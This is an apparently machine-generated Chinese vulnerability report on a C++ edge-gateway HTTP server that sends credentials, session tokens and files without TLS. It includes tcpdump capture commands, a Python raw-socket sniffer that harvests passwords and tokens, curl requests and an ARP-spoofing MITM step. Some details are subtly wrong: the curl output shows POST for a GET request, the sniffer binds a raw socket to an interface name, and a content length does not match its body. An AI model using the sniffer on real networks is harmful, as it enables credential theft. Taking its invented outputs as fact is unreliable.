# VULN-SEC-CPP-CRYPTO-HTTP-001: HTTP 服务器使用纯 POSIX TCP 套接字无任何 TLS 加密导致全部流量明文传输

**严重性**: Critical | **CWE**: CWE-319 (Cleartext Transmission of Sensitive Information) | **置信度**: 85/100
**位置**: `src/http_server.cpp:81-134` @ `run`
**语言/框架**: C++ / POSIX Sockets
**分析类型**: crypto
**Source/Sink**: network_socket → cleartext_transport
**规则/证据来源**: c_cpp.crypto.no_tls / llm

---

## 1. 漏洞细节

该边缘网关（edge-gateway）服务的 HTTP 服务器完全基于 POSIX 原生 TCP 套接字实现（`socket()` / `bind()` / `listen()` / `accept()` / `recv()` / `send()`），**没有任何 TLS/SSL 加密层**。整个代码库中不存在 OpenSSL、mbedTLS、wolfSSL 或任何其他 TLS 库的引用、头文件包含或链接配置。

这意味着所有通过该服务器传输的数据——包括用户凭据（用户名和密码）、会话令牌（session token）、文件内容、管理导出令牌以及系统配置信息——均以明文形式在网络上传输。任何处于同一网络段的攻击者都可以通过被动嗅探（Passive Sniffing）或主动中间人攻击（MITM）截获全部通信内容。

### 证据摘要

- **触发源**: network_socket（TCP 端口 8080，绑定 `INADDR_ANY`）
- **危险点**: cleartext_transport（`recv()` 和 `send()` 直接读写明文数据）
- **已检查的清洗/缓解**: 无。整个代码库中未发现任何 TLS 相关符号（`SSL_CTX`、`SSL_new`、`SSL_accept` 等），CMakeLists.txt 未链接任何 TLS 库，无配置选项可启用加密
- **关键证据**:
  - `src/http_server.cpp:82` — `socket(AF_INET, SOCK_STREAM, 0)` 创建纯 TCP 套接字
  - `src/http_server.cpp:113` — `recv(client, buffer, sizeof(buffer) - 1, 0)` 接收明文 HTTP 请求
  - `src/http_server.cpp:131` — `send(client, raw.data(), raw.size(), 0)` 发送明文 HTTP 响应
  - `CMakeLists.txt` — 仅编译核心源文件，无 `find_package(OpenSSL)` 或 `target_link_libraries(... ssl crypto)` 等
  - `src/main.cpp:40-52` — POST /login 端点通过查询参数接收用户名和密码，响应体返回会话令牌，全部明文传输

## 2. 漏洞代码

**文件**: `src/http_server.cpp` (行 81-134)

```cpp
int HttpServer::run() {
  int fd = ::socket(AF_INET, SOCK_STREAM, 0);    // [漏洞根因] 创建纯 TCP 套接字，无 TLS 封装
  if (fd < 0) {
    throw std::runtime_error("socket failed");
  }

  int reuse = 1;
  setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));

  sockaddr_in address {};
  address.sin_family = AF_INET;
  address.sin_addr.s_addr = INADDR_ANY;           // 绑定所有网络接口
  address.sin_port = htons(static_cast<uint16_t>(port_));  // 默认端口 8080

  if (bind(fd, reinterpret_cast<sockaddr*>(&address), sizeof(address)) < 0) {
    close(fd);
    throw std::runtime_error("bind failed");
  }

  if (listen(fd, 16) < 0) {
    close(fd);
    throw std::runtime_error("listen failed");
  }

  for (;;) {
    int client = accept(fd, nullptr, nullptr);     // 接受连接后无 TLS 握手
    if (client < 0) {
      continue;
    }

    char buffer[4096];
    std::memset(buffer, 0, sizeof(buffer));
    ssize_t n = recv(client, buffer, sizeof(buffer) - 1, 0);  // [明文接收] 直接读取明文 HTTP 请求
    if (n <= 0) {
      close(client);
      continue;
    }

    HttpRequest request = parseRequest(std::string(buffer, static_cast<size_t>(n)));
    auto handler = handlers_.find(routeKey(request.method, request.path));

    HttpResponse response;
    if (handler == handlers_.end()) {
      response.status = 404;
      response.body = "not found\n";
    } else {
      response = handler->second(request);          // 处理请求（含凭据、令牌等敏感数据）
    }

    std::string raw = serializeResponse(response);
    send(client, raw.data(), raw.size(), 0);        // [明文发送] 直接发送明文 HTTP 响应
    close(client);
  }
}
```

**代码分析**:

1. **第 82 行**: `socket(AF_INET, SOCK_STREAM, 0)` 创建标准 TCP 套接字。在安全实现中，此处应使用 TLS 库封装（如 `SSL_new()` + `SSL_set_fd()`），但代码中完全没有 TLS 初始化逻辑。
2. **第 106 行**: `accept()` 接受客户端连接后，直接进入数据读写循环，**没有任何 TLS 握手步骤**（如 `SSL_accept()`）。
3. **第 113 行**: `recv()` 直接从 TCP 套接字读取原始字节流，获取的是未加密的 HTTP 请求明文，包含 URL、头部（可能含 Authorization、Cookie）和请求体（含用户名、密码）。
4. **第 131 行**: `send()` 将序列化后的 HTTP 响应直接写入 TCP 套接字，响应体中的会话令牌、文件内容等敏感信息以明文形式传输。

**敏感数据端点分析**（`src/main.cpp`）:

| 端点 | 敏感数据（请求方向） | 敏感数据（响应方向） |
|------|----------------------|----------------------|
| `POST /login` | 用户名 + 密码（查询参数） | 会话令牌 `sess-{user}-{timestamp}` |
| `GET /files` | 文件名参数 | 文件完整内容 |
| `POST /debug/ping` | 主机参数 | ping 命令输出 |
| `GET /admin/export` | 管理导出令牌 `letmein-export` | 系统配置信息（用户数、备份状态、数据目录） |

## 3. 完整攻击链路

```
[攻击者] 网络嗅探器 / MITM 代理（同一网段）
↓ 监听 TCP 端口 8080 的明文流量
[入口点] socket(AF_INET, SOCK_STREAM, 0) @ src/http_server.cpp:82
↓ 服务器绑定 INADDR_ANY:8080，接受所有 TCP 连接
[连接建立] accept(fd, nullptr, nullptr) @ src/http_server.cpp:106
↓ 无 TLS 握手，直接进入明文通信
[明文请求] recv(client, buffer, 4095, 0) @ src/http_server.cpp:113
↓ 攻击者截获完整 HTTP 请求（含 URL 中的用户名/密码、请求头、请求体）
[请求解析] parseRequest() @ src/http_server.cpp:119
↓ 解析出 method、path、query（含凭据）、headers、body
[业务处理] handler->second(request) @ src/http_server.cpp:127
↓ 执行登录验证、文件读取等操作，生成含敏感数据的响应
[明文响应] send(client, raw.data(), raw.size(), 0) @ src/http_server.cpp:131
↓ 攻击者截获完整 HTTP 响应（含会话令牌、文件内容、系统配置）
[信息泄露] 攻击者获得用户名、密码、会话令牌、文件内容、管理令牌
```

**攻击链路详细说明**:

1. **步骤 1 — 网络监听**: 攻击者在同一网络段（如同一 WiFi、同一 VLAN、或已攻陷的路由器上）部署嗅探工具（如 `tcpdump`、`Wireshark`），监听目标服务器 8080 端口的 TCP 流量。
2. **步骤 2 — 截获请求**: 当合法用户发送 `POST /login?user=admin&password=admin123` 请求时，攻击者直接从 TCP 数据包中提取完整的 HTTP 请求明文，获得用户名和密码。
3. **步骤 3 — 截获响应**: 服务器返回 `session=sess-admin-1718697600` 响应时，攻击者同样从 TCP 数据包中提取会话令牌。
4. **步骤 4 — 会话劫持**: 攻击者使用截获的会话令牌直接访问需要认证的接口，冒充合法用户。
5. **步骤 5 — 横向扩展**: 攻击者利用截获的管理导出令牌 `letmein-export` 访问 `/admin/export`，获取系统配置信息。

## 4. 攻击场景

**攻击者画像**: 网络相邻的攻击者——与目标服务器处于同一局域网、同一 WiFi 网络、或控制了网络路径中任一中间节点（路由器、交换机、ARP 欺骗）的攻击者。

**攻击向量**: 被动网络嗅探（Passive Sniffing）或主动中间人攻击（Active MITM）。攻击者无需与服务器建立任何特殊连接，只需能够观察到服务器与客户端之间的网络流量。

**利用难度**: **低**

### 攻击步骤

1. **部署嗅探工具**: 攻击者在同一网络中使用 `tcpdump -i eth0 port 8080 -A` 或 Wireshark 开始捕获 8080 端口的 TCP 流量。
2. **等待用户登录**: 等待合法用户向服务器发送 `POST /login` 请求。
3. **提取凭据**: 从捕获的 HTTP 请求 URL 中直接读取 `user=` 和 `password=` 参数值。
4. **提取会话令牌**: 从服务器响应体中读取 `session=sess-{user}-{timestamp}` 令牌。
5. **会话劫持**: 使用截获的会话令牌构造后续请求，冒充已认证用户执行操作。
6. **（可选）主动 MITM**: 使用 ARP 欺骗（`arpspoof`）将自己插入客户端与服务器之间的通信路径，实时拦截和篡改所有流量。

## 5. 攻击条件

| 条件类型 | 要求 | 说明 |
|----------|------|------|
| 网络可达性 | 同一网络段 | 攻击者需要能够观察到客户端与服务器之间的网络流量（同一 LAN/WiFi/VLAN，或通过 ARP 欺骗、DNS 劫持等手段） |
| 认证要求 | 无 | 被动嗅探不需要任何认证；主动 MITM 需要能够发送 ARP 包 |
| 配置依赖 | 默认配置即可 | 服务器默认监听 `INADDR_ANY:8080`，绑定所有网络接口，无需特殊配置 |
| 环境依赖 | 无特殊要求 | 任何支持 TCP 流量捕获的操作系统均可（Linux/macOS/Windows） |
| 时序条件 | 无 | 被动嗅探可随时进行，无需特定时序 |

## 6. 造成影响

| 影响维度 | 等级 | 说明 |
|----------|------|------|
| 机密性 | **高** | 所有传输数据以明文暴露，包括用户凭据（用户名+密码）、会话令牌、文件内容、管理导出令牌、系统配置信息。攻击者可完整获取所有敏感业务数据。 |
| 完整性 | **高** | 由于缺乏 TLS 保护，主动 MITM 攻击者可任意篡改请求和响应内容。例如修改 `/files` 响应中的文件内容、篡改 `/debug/ping` 的请求参数以注入恶意命令、或修改 `/login` 响应以欺骗用户。 |
| 可用性 | **中** | MITM 攻击者可选择性丢弃或延迟特定请求/响应，导致服务部分不可用。但被动嗅探本身不影响可用性。 |

**影响范围**: **全局影响**。该漏洞影响通过该服务器传输的**所有数据**，涵盖全部 5 个 API 端点。由于服务器绑定 `INADDR_ANY`（所有网络接口），所有网络接口上的流量均受影响。结合会话令牌的可预测性（`sess-{username}-{timestamp}` 格式），攻击者甚至可以离线伪造有效令牌，进一步扩大影响范围。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 1: 被动嗅探截获登录凭据

```bash
# 在服务器所在网络的同一网段执行（需要 root 权限）
# 捕获 8080 端口的所有 TCP 流量并以 ASCII 显示
sudo tcpdump -i eth0 -A 'tcp port 8080'

# 预期输出示例（当用户登录时）:
# POST /login?user=admin&password=admin123 HTTP/1.1
# Host: 192.168.1.100:8080
#
# ---
# HTTP/1.1 200 OK
# Content-Type: text/plain
# Content-Length: 26
# Connection: close
#
# session=sess-admin-1718697600
```

### PoC 2: 使用 Python 模拟 MITM 攻击

```python
#!/usr/bin/env python3
"""
PoC: 明文 HTTP 流量嗅探器
仅供安全测试使用 - 用于验证 VULN-SEC-CPP-CRYPTO-HTTP-001

用法: sudo python3 sniff_cleartext.py --interface eth0 --port 8080
"""
import socket
import struct
import sys
import argparse
import re

def sniff_traffic(interface, port):
    """在指定接口上嗅探 TCP 流量并提取 HTTP 明文内容"""
    # 创建原始套接字
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.bind((interface, 0))
    
    print(f"[*] 正在监听 {interface} 上的 TCP {port} 端口流量...")
    print(f"[*] 等待 HTTP 请求...\n")
    
    credentials_found = []
    tokens_found = []
    
    while True:
        raw_data, addr = s.recvfrom(65535)
        
        # 解析 IP 头
        ip_header = raw_data[:20]
        ihl_ver = ip_header[0]
        ihl = (ihl_ver & 0xF) * 4
        
        # 解析 TCP 头
        tcp_header = raw_data[ihl:ihl+20]
        src_port = struct.unpack('!H', tcp_header[0:2])[0]
        dst_port = struct.unpack('!H', tcp_header[2:4])[0]
        
        if dst_port == port or src_port == port:
            # 提取 TCP 数据载荷
            data_offset = ((tcp_header[12] >> 4) & 0xF) * 4
            payload = raw_data[ihl + data_offset:]
            
            if payload:
                try:
                    text = payload.decode('utf-8', errors='replace')
                    
                    # 检测登录请求中的凭据
                    cred_match = re.search(r'user=([^&\s]+)&password=([^&\s]+)', text)
                    if cred_match:
                        user, passwd = cred_match.groups()
                        credentials_found.append((user, passwd))
                        print(f"[!] 截获登录凭据: 用户名={user}, 密码={passwd}")
                    
                    # 检测响应中的会话令牌
                    token_match = re.search(r'session=(sess-[^\s\r\n]+)', text)
                    if token_match:
                        token = token_match.group(1)
                        tokens_found.append(token)
                        print(f"[!] 截获会话令牌: {token}")
                    
                    # 检测管理导出令牌
                    export_match = re.search(r'token=([^&\s]+)', text)
                    if export_match:
                        export_token = export_match.group(1)
                        print(f"[!] 截获导出令牌: {export_token}")
                        
                except Exception:
                    pass

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='明文 HTTP 流量嗅探器 (安全测试用)')
    parser.add_argument('--interface', default='eth0', help='网络接口')
    parser.add_argument('--port', type=int, default=8080, help='目标端口')
    args = parser.parse_args()
    
    try:
        sniff_traffic(args.interface, args.port)
    except KeyboardInterrupt:
        print(f"\n[*] 嗅探结束")
        print(f"[*] 共截获 {len(credentials_found)} 组凭据, {len(tokens_found)} 个会话令牌")
```

### PoC 3: 使用 curl 验证明文传输

```bash
# 在服务器上启动服务
./edge-gateway 8080

# 在另一台机器上发送登录请求（同一网络中的攻击者可嗅探到此流量）
curl -v "http://TARGET_IP:8080/login?user=admin&password=admin123"

# 输出:
# * Connected to TARGET_IP (x.x.x.x) port 8080
# > POST /login?user=admin&password=admin123 HTTP/1.1
# > Host: TARGET_IP:8080
# >
# < HTTP/1.1 200 OK
# < Content-Type: text/plain
# < Content-Length: 26
# < Connection: close
# <
# session=sess-admin-1718697600

# 注意: 整个请求和响应均为明文传输
# 用户名 admin、密码 admin123、会话令牌 sess-admin-1718697600 全部可见
```

**使用说明**: 
1. 在目标服务器上启动 edge-gateway 服务
2. 在同一网络中的攻击机上运行 PoC 1（`tcpdump`）或 PoC 2（Python 嗅探脚本）
3. 从客户端发送登录请求到服务器
4. 观察嗅探器输出，确认凭据和令牌以明文形式被截获

**预期结果**: 嗅探器将清晰显示完整的 HTTP 请求和响应内容，包括 URL 中的用户名和密码、响应体中的会话令牌，所有数据均为可读明文。

## 8. 验证环境搭建

### 基础环境

- **操作系统**: Linux（Ubuntu 20.04+ / Debian 11+ / CentOS 8+）
- **编译器**: GCC 9+ 或 Clang 10+（支持 C++17）
- **构建工具**: CMake 3.16+
- **依赖**: 无外部依赖（纯 POSIX 套接字）
- **嗅探工具**: tcpdump / Wireshark / Python 3（用于 PoC 脚本）

### 构建步骤

```bash
# 克隆/获取项目源码
cd /scan/project

# 创建构建目录
mkdir -p build && cd build

# 配置和编译
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$(nproc)

# 生成的可执行文件: build/edge-gateway
```

### 运行配置

```bash
# 启动服务（默认端口 8080）
./build/edge-gateway

# 或指定端口
./build/edge-gateway 9090
```

### 验证步骤

1. **启动服务**: 在服务器机器上执行 `./build/edge-gateway 8080`
2. **启动嗅探器**: 在同一网络的攻击机上执行 `sudo tcpdump -i eth0 -A 'tcp port 8080'`
3. **发送登录请求**: 在客户端机器上执行 `curl "http://SERVER_IP:8080/login?user=admin&password=admin123"`
4. **检查嗅探器输出**: 确认攻击机上 tcpdump 显示了完整的用户名、密码和会话令牌明文
5. **验证文件读取**: 执行 `curl "http://SERVER_IP:8080/files?name=test.txt"`，确认文件内容以明文传输
6. **验证管理导出**: 执行 `curl "http://SERVER_IP:8080/admin/export?token=letmein-export"`，确认系统配置信息以明文传输

### 预期结果

- tcpdump 输出中将显示完整的 HTTP 请求和响应明文内容
- 可清晰看到 `user=admin&password=admin123` 凭据
- 可清晰看到 `session=sess-admin-{timestamp}` 会话令牌
- 可清晰看到文件内容和系统配置信息
- 所有数据均为未加密的可读文本，无需任何解密操作
